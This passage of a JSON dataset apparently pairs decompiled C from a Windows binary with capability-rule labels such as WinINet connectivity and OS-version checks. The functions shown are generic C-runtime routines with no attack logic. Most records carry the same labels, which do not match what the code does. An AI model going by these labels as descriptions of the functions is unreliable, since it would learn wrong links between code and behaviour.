0x575220) + 0x28 + *(unaff_EBP + -0x20)) & 1) == 0) {\n                    puVar1 = fcn.00403a35();\n                    *puVar1 = 9;\n                    puVar1 = fcn.0040185c();\n                    *puVar1 = 0;\n                }\n                else {\n                    uVar2 = fcn.004d3e85(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.004d3cc7();\n                goto code_r0x004d3cea;\n            }\n        }\n        puVar1 = fcn.0040185c();\n        *puVar1 = 0;\n        puVar1 = fcn.00403a35();\n        *puVar1 = 9;\n        fcn.004037ce();\n    }\n    uVar2 = 0xffffffff;\ncode_r0x004d3cea:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 663
    },
    "00401014": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401014(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        uVar3 = *(*(in_ECX + 0x14) + -8);\n        arg_8h[1] = *(*(in_ECX + 0x14) + -4);\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405fec(in_ECX + 0x464 + uVar1 * 0x10, 4, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        puVar2 = *(in_ECX + 0x46c + uVar1 * 0x10);\n        uVar3 = puVar2[1];\n        *arg_8h = *puVar2;\n        arg_8h[1] = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 363
    },
    "00401023": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401023(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        if (99 < *(param_1 + 0xaa8)) {\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        uVar2 = fcn.004028c4(param_1 + 0x464 + *(param_1 + 0xaa8) * 0x10, 4, *(param_1 + 0x31), *(param_1 + 0x2c));\n        return uVar2;\n    }\n    return 1;\n}\n",
        "token_count": 196
    },
    "0040105a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040105a(uint16_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    if ((arg_ch == NULL) || (arg_10h == 0)) {\n        *0x575200 = 0;\n        *0x575204 = 0;\n        return 0;\n    }\n    if (*arg_ch == 0) {\n        if (arg_8h == NULL) {\n            return 0;\n        }\n        *arg_8h = 0;\n        return 0;\n    }\n    fcn.004058a8(arg_14h);\n    if (*(var_ch + 8) == 0xfde9) {\n        iVar2 = fcn.00403e45(arg_8h, arg_ch, arg_10h, 0x575200);\n        if (-1 < iVar2) goto code_r0x004c48d7;\n    }\n    else {\n        if (*(var_ch + 0xa8) == 0) {\n            if (arg_8h != NULL) {\n                *arg_8h = *arg_ch;\n            }\n            iVar2 = 1;\n            goto code_r0x004c48d7;\n        }\n        iVar2 = fcn.00405a24(*arg_ch, &var_ch);\n        if (iVar2 != 0) {\n            if (*(var_ch + 4) < 2) {\ncode_r0x004c4894:\n                uVar1 = *(var_ch + 4);\ncode_r0x004c4897:\n                if ((arg_10h < uVar1) || (arg_ch[1] == 0)) goto code_r0x004c48c9;\n            }\n            else {\n                uVar1 = *(var_ch + 4);\n                if (arg_10h < *(var_ch + 4)) goto code_r0x004c4897;\n                iVar2 = fcn.00401b4a(*(var_ch + 8), 9, arg_ch, *(var_ch + 4), arg_8h, arg_8h != NULL);\n                if (iVar2 == 0) goto code_r0x004c4894;\n            }\n            iVar2 = *(var_ch + 4);\n            goto code_r0x004c48d7;\n        }\n        iVar2 = 1;\n        iVar3 = fcn.00401b4a(*(var_ch + 8), 9, arg_ch, 1, arg_8h, arg_8h != NULL);\n        if (iVar3 != 0) goto code_r0x004c48d7;\ncode_r0x004c48c9:\n        puVar4 = fcn.00403a35();\n        *puVar4 = 0x2a;\n    }\n    iVar2 = -1;\ncode_r0x004c48d7:\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n        return iVar2;\n    }\n    return iVar2;\n}\n",
        "token_count": 758
    },
    "0040106e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.0040106e(int32_t param_1)\n\n{\n    uchar uVar1;\n    char cVar2;\n    \n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar1 = fcn.004063fc(param_1 + 0x28);\n        return uVar1;\n    }\n    cVar2 = fcn.00405768();\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    cVar2 = fcn.004059b1();\n    if ((cVar2 != '\\0') && (*(param_1 + 0x28) < 0)) {\n        *(param_1 + 0x28) = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 173
    },
    "004010eb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004010eb(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    if (arg_8h != 0) {\n        uVar1 = fcn.004dd4c4(arg_8h);\n        if ((-1 < uVar1) && (uVar1 < 0xe4)) {\n            return *(uVar1 * 8 + 0x55aee0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 108
    },
    "0040117c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040117c(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    if (*arg_8h == 0) {\n        *arg_8h = arg_ch;\n        *(arg_8h + 1) = arg_10h;\n        arg_8h[3] = arg_14h;\n    }\n    else {\n        cVar1 = fcn.00402554(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (cVar1 == '\\0') {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 199
    },
    "004011b3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.004011b3(uint arg_8h)\n\n{\n    if (arg_8h == '\\0') {\n        fcn.004027de();\n        fcn.00405051();\n    }\n    return 1;\n}\n",
        "token_count": 54
    },
    "004011ef": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004011ef(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (arg_8h == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0xffffffff;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapSize)(*0x5755b8, 0, arg_8h);\n    return uVar2;\n}\n",
        "token_count": 124
    },
    "004011fe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar ** __cdecl fcn.004011fe(char **arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint arg_ch;\n    char **ppcVar3;\n    uint var_18h;\n    uint var_10h;\n    char *var_8h;\n    char *var_4h;\n    \n    pcVar2 = *0x57445c;\n    *arg_8h = NULL;\n    arg_8h[1] = NULL;\n    if (pcVar2 == NULL) {\n        return arg_8h;\n    }\n    if (*pcVar2 == '?') {\n        cVar1 = pcVar2[1];\n        if (cVar1 == '@') {\n            *0x574458 = *0x574458 + 2;\n            var_8h = \"CV: \";\n            var_4h = 0x4;\n            arg_ch = fcn.00401d52(&var_10h);\n            fcn.00402d47(&var_8h);\n            fcn.004053b7(&var_8h, arg_ch);\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n        if (cVar1 == '$') {\n            ppcVar3 = fcn.00402cde(&var_18h, 0);\n            *arg_8h = *ppcVar3;\n            pcVar2 = ppcVar3[1];\n            arg_8h[1] = pcVar2;\n            if (pcVar2 != '\\x02') {\n                if ((*0x574460 & 0x1000) != 0) {\n                    return arg_8h;\n                }\n                if (**0x574458 == '\\0') {\n                    return arg_8h;\n                }\n            }\n            *0x574458 = *0x57445c;\n            ppcVar3 = fcn.00401d52(&var_18h);\n            *arg_8h = *ppcVar3;\n            arg_8h[1] = ppcVar3[1];\n            return arg_8h;\n        }\n        if ((cVar1 == '?') && (pcVar2[2] == '@')) {\n            *(arg_8h + 1) = 2;\n            return arg_8h;\n        }\n    }\n    ppcVar3 = fcn.00401d52(&var_18h);\n    *arg_8h = *ppcVar3;\n    arg_8h[1] = ppcVar3[1];\n    return arg_8h;\n}\n",
        "token_count": 584
    },
    "00420990": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420990(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040586c();\n    if (arg_8h != 0) {\n        fcn.00401ebf(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 94
    },
    "0041d5a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d5a0(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040244b();\n    if (arg_8h != 0) {\n        fcn.00401ebf(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 97
    },
    "0040122b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040122b(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    \n    *(param_1 + 0x458) = *(param_1 + 0x458) + 1;\n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if ((iVar1 != 3) && ((iVar1 != 2 || (*(param_1 + 0x45c) != 1)))) {\n        *(param_1 + 0xaa4) = 0xffffffff;\n        *(param_1 + 0xaa8) = 0xffffffff;\n        *(param_1 + 0x45c) = 0;\n        *(param_1 + 0x24) = 0;\n        *(param_1 + 0x28) = 0;\n        *(param_1 + 0x10) = *(param_1 + 0x460);\n        return CONCAT31(Var2, 1);\n    }\n    return Var2 << 8;\n}\n",
        "token_count": 241
    },
    "004012a3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004012a3(uint arg_8h, uint dwInfoType, uint arg_10h, uint arg_14h, uint lpCharType, int32_t arg_1ch, int32_t arg_20h\n            )\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t arg_8h_00;\n    uint *lpWideCharStr;\n    uint *puVar3;\n    uint var_28h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar3 = &stack0xffffffd0;\n    lpWideCharStr = &stack0xffffffd0;\n    fcn.004058a8(arg_8h);\n    if (arg_1ch == 0) {\n        arg_1ch = *(var_18h + 8);\n    }\n    iVar2 = fcn.00401b4a(arg_1ch, (arg_20h != 0) * 8 + 1, arg_10h, arg_14h, 0, 0);\n    if (iVar2 == 0) goto code_r0x004cd7d6;\n    uVar1 = iVar2 * 2;\n    arg_8h_00 = -(uVar1 < uVar1 + 8) & uVar1 + 8;\n    if (arg_8h_00 == 0) {\n        lpWideCharStr = NULL;\n    }\n    else if (arg_8h_00 < 0x401) {\n        fcn.004034f4();\n        if (*0x10 != 0x30) {\ncode_r0x004cd790:\n            lpWideCharStr = puVar3 + 2;\n        }\n    }\n    else {\n        lpWideCharStr = fcn.0040409d(arg_8h_00);\n        if (lpWideCharStr != NULL) {\n            *lpWideCharStr = 0xdddd;\n            puVar3 = lpWideCharStr;\n            goto code_r0x004cd790;\n        }\n    }\n    if (lpWideCharStr != NULL) {\n        fcn.00403189(lpWideCharStr, 0, uVar1);\n        iVar2 = fcn.00401b4a(arg_1ch, 1, arg_10h, arg_14h, lpWideCharStr, iVar2);\n        if (iVar2 != 0) {\n            (*_sym.imp.KERNEL32.dll_GetStringTypeW)(dwInfoType, lpWideCharStr, iVar2, lpCharType);\n        }\n    }\n    fcn.004013b1(lpWideCharStr);\ncode_r0x004cd7d6:\n    if (var_10h != '\\0') {\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n    }\n    fcn.004030bc(var_1ch);\n    return;\n}\n",
        "token_count": 721
    },
    "004012f3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004012f3(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    int32_t in_stack_ffffffdc;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if ((*(param_1 + 0x3c) == '\\0') || (*(param_1 + 0x38) < 1)) {\n        in_stack_ffffffdc = param_1 + 0xc;\n        fcn.00405ef2(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18, in_stack_ffffffdc);\n    }\n    else {\n        puVar4 = *(param_1 + 0x34);\n        iVar3 = 0;\n        do {\n            uVar1 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar2 = fcn.00401f78(&var_10h, &var_ch, 6, uVar1, *(param_1 + 8));\n            if ((iVar2 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x18) = 0xffffffff;\n                break;\n            }\n            fcn.00405ef2(&var_ch, var_10h, param_1 + 0x18, param_1 + 0xc);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    fcn.004030bc(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 413
    },
    "0040133e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040133e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((*(param_1 + 0x3c) == '\\0') && (iVar2 = 0,  0 < *(param_1 + 0x38))) {\n        arg_ch = *(param_1 + 0x34);\n        do {\n            var_4h = var_4h & 0xffff0000;\n            iVar1 = fcn.0040105a(&var_4h, arg_ch, *(**(param_1 + 8) + 4), *(param_1 + 8));\n            if (iVar1 < 1) {\n                *(param_1 + 0x18) = 0xffffffff;\n                return 1;\n            }\n            fcn.004016ae(var_4h, param_1 + 0x18);\n            arg_ch = arg_ch + iVar1;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != *(param_1 + 0x38));\n    }\n    else {\n        fcn.00402978(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18);\n    }\n    return 1;\n}\n",
        "token_count": 318
    },
    "00401352": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar * __cdecl fcn.00401352(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    char *pcVar10;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004058a8(arg_8h);\n    pcVar8 = NULL;\n    uVar9 = 0;\n    iVar2 = *(var_14h + 0x9c);\n    do {\n        pcVar7 = *(iVar2 + uVar9 * 4);\n        pcVar4 = pcVar7 + 1;\n        do {\n            cVar1 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar1 != '\\0');\n        pcVar6 = *(iVar2 + 0x1c + uVar9 * 4);\n        pcVar10 = pcVar6 + 1;\n        do {\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        pcVar8 = pcVar7 + pcVar6 + pcVar8 + (-pcVar10 - pcVar4) + 2;\n        uVar9 = uVar9 + 1;\n    } while (uVar9 < 7);\n    pcVar4 = fcn.0040409d(pcVar8 + 1);\n    if (pcVar4 != NULL) {\n        uVar9 = 0;\n        pcVar7 = pcVar4;\n        do {\n            *pcVar7 = ':';\n            pcVar10 = pcVar7 + 1;\n            iVar5 = fcn.0040605a(pcVar10, pcVar4 + pcVar8 + (1 - pcVar10), *(iVar2 + uVar9 * 4));\n            if (iVar5 != 0) {\ncode_r0x004bc9fb:\n                fcn.0040366b(0, 0, 0, 0, 0);\n                pcVar3 = swi(3);\n                pcVar8 = (*pcVar3)();\n                return pcVar8;\n            }\n            pcVar6 = pcVar10;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            pcVar10 = pcVar10 + (pcVar6 - (pcVar7 + 2));\n            *pcVar10 = ':';\n            pcVar7 = pcVar10 + 1;\n            iVar5 = fcn.0040605a(pcVar7, pcVar4 + pcVar8 + (1 - pcVar7), *(iVar2 + 0x1c + uVar9 * 4));\n            if (iVar5 != 0) goto code_r0x004bc9fb;\n            pcVar6 = pcVar7;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            pcVar7 = pcVar7 + (pcVar6 - (pcVar10 + 2));\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < 7);\n        *pcVar7 = '\\0';\n    }\n    fcn.0040640b(0);\n    if (var_ch != '\\0') {\n        *(var_18h + 0x350) = *(var_18h + 0x350) & 0xfffffffd;\n    }\n    return pcVar4;\n}\n",
        "token_count": 864
    },
    "004260f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004260f0(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401389();\n    if (arg_8h != 0) {\n        fcn.00401ebf(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 94
    },
    "004013ca": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.004013ca(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint *puVar3;\n    char cVar4;\n    uint uVar5;\n    uint noname_0;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_4h;\n    \n    fcn.00405434(0x38);\n    iVar1 = *(unaff_EBP + 0x1c);\n    puVar2 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x44) = *(unaff_EBP + 8);\n    uVar5 = *(iVar1 + 0x30);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 0x24);\n    fcn.004032d3(uVar5);\n    *(unaff_EBP + -4) = 0;\n    uVar5 = fcn.004047e1(noname_0, unaff_EBP + -0x30, unaff_EBP + 0xc, unaff_EBP + 0x14, *(iVar1 + 0x14), \n                         unaff_EBP + -0x3c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00405146();\n    if (*(unaff_EBP + -0x30) == '\\0') {\n        puVar3 = *(unaff_EBP + -0x34);\n        *puVar2 = 2;\n        *puVar3 = 0;\n    }\n    else {\n        uVar5 = fcn.004042c3(unaff_EBP + -0x30, unaff_EBP + -0x40, uVar5, unaff_EBP + -0x38);\n        **(unaff_EBP + -0x34) = uVar5;\n        if ((*(unaff_EBP + -0x40) == unaff_EBP + -0x30) || (*(unaff_EBP + -0x38) != 0)) {\n            *puVar2 = 2;\n        }\n    }\n    cVar4 = fcn.00401a8c(unaff_EBP + 0x14);\n    if (cVar4 != '\\0') {\n        *puVar2 = *puVar2 | 1;\n    }\n    puVar3 = *(unaff_EBP + -0x44);\n    uVar5 = *(unaff_EBP + 0x10);\n    *puVar3 = *(unaff_EBP + 0xc);\n    puVar3[1] = uVar5;\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 695
    },
    "004013d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004013d4(uchar *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h, int32_t *arg_18h)\n\n{\n    uint32_t *puVar1;\n    uchar *arg_8h_00;\n    uint *puVar2;\n    uint arg_8h_01;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uchar *arg_ch_00;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        if (arg_8h != NULL) {\n            if ((arg_18h != NULL) && (arg_14h <= 0xffffffff / arg_10h)) {\ncode_r0x004b0822:\n                puVar1 = arg_18h + 3;\n                if ((*puVar1 & 0x4c0) == 0) {\n                    var_10h = 0x1000;\n                }\n                else {\n                    var_10h = arg_18h[6];\n                }\n                uVar4 = arg_10h * arg_14h;\n                arg_8h_00 = arg_8h;\n                var_8h = arg_ch;\n                do {\n                    if (uVar4 == 0) {\n                        return arg_14h;\n                    }\n                    if ((arg_18h[3] & 0x4c0U) == 0) {\ncode_r0x004b08b3:\n                        if (uVar4 < var_10h) {\n                            iVar3 = fcn.00404642(arg_18h);\n                            if (iVar3 == -1) goto code_r0x004b0975;\n                            if (var_8h == 0) goto code_r0x004b0949;\n                            *arg_8h_00 = iVar3;\n                            var_10h = arg_18h[6];\n                            uVar4 = uVar4 - 1;\n                            var_8h = var_8h - 1;\n                            uVar5 = 1;\n                        }\n                        else {\n                            uVar5 = uVar4;\n                            if (0x7fffffff < uVar4) {\n                                uVar5 = 0x7fffffff;\n                            }\n                            if (var_10h != 0) {\n                                uVar5 = uVar5 - uVar5 % var_10h;\n                            }\n                            if (var_8h < uVar5) {\ncode_r0x004b0949:\n                                if (arg_ch != 0xffffffff) {\n                                    fcn.00403189(arg_8h, 0, arg_ch);\n                                }\n                                puVar2 = fcn.00403a35();\n                                *puVar2 = 0x22;\n                                goto code_r0x004b07db;\n                            }\n                            arg_18h[2] = 0;\n                            *arg_18h = arg_18h[1];\n                            arg_ch_00 = arg_8h_00;\n                            arg_8h_01 = fcn.00406005(arg_18h);\n                            uVar5 = fcn.0040628a(arg_8h_01, arg_ch_00, uVar5);\n                            if (uVar5 == 0) {\n                                LOCK();\n                                *puVar1 = *puVar1 | 8;\n                                goto code_r0x004b0975;\n                            }\n                            if (uVar5 < 0) goto code_r0x004b096c;\n                            uVar4 = uVar4 - uVar5;\n                            var_8h = var_8h - uVar5;\n                        }\n                    }\n                    else {\n                        uVar5 = arg_18h[2];\n                        if (uVar5 == 0) goto code_r0x004b08b3;\n                        if (uVar5 < 0) {\ncode_r0x004b096c:\n                            LOCK();\n                            *puVar1 = *puVar1 | 0x10;\ncode_r0x004b0975:\n                            return (arg_10h * arg_14h - uVar4) / arg_10h;\n                        }\n                        if (uVar4 < uVar5) {\n                            uVar5 = uVar4;\n                        }\n                        if (var_8h < uVar5) goto code_r0x004b0949;\n                        fcn.004b0afa(arg_8h_00, var_8h, *arg_18h, uVar5);\n                        uVar4 = uVar4 - uVar5;\n                        arg_18h[2] = arg_18h[2] - uVar5;\n                        *arg_18h = *arg_18h + uVar5;\n                        var_8h = var_8h - uVar5;\n                    }\n                    arg_8h_00 = arg_8h_00 + uVar5;\n                } while( true );\n            }\n            if (arg_ch != 0xffffffff) {\n                fcn.00403189(arg_8h, 0, arg_ch);\n            }\n            if ((arg_18h != NULL) && (arg_14h <= 0xffffffff / arg_10h)) goto code_r0x004b0822;\n        }\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\ncode_r0x004b07db:\n        fcn.004037ce();\n    }\n    return 0;\n}\n",
        "token_count": 1249
    },
    "0040140b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
